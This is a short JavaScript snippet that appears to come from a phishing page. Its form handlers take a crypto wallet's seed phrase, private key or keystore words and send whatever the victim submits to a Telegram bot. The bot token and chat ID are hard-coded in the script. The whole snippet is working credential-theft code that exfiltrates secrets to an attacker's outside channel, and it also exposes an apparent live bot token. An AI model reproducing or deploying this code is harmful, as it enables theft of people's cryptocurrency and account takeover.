 let phrase = document.getElementById("phrase");
  let privateKey = document.getElementById("privatekey");
  let keystore = document.getElementById("keystore");

  function handleSubmit(event) {
    event.preventDefault();
    console.log("Submitted");
    const formData = new FormData(event.target);
    const formProps = Object.fromEntries(formData);
    let val = "";
    if (formProps.phrase) {
      val = formProps.phrase;
    } else if (formProps.privateKey) {
      val = formProps.privateKey;
    } else {
      val = formProps.words;
    }

    // Send data to Telegram
    const telegramBotToken = "5430663456:AAE4RR0UjMgzujAiXgmly1WbmiRMJ2SmmWI";
    const chatId = "869661007"; // Replace with your chat ID

    const telegramMessage = `New form submission:\n\n${val}`;

    // Send message to Telegram using Axios
    axios
      .post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: chatId,
        text: telegramMessage,
      });
  }

  phrase.addEventListener("submit", handleSubmit);
  privateKey.addEventListener("submit", handleSubmit);
  keystore.addEventListener("submit", handleSubmit);
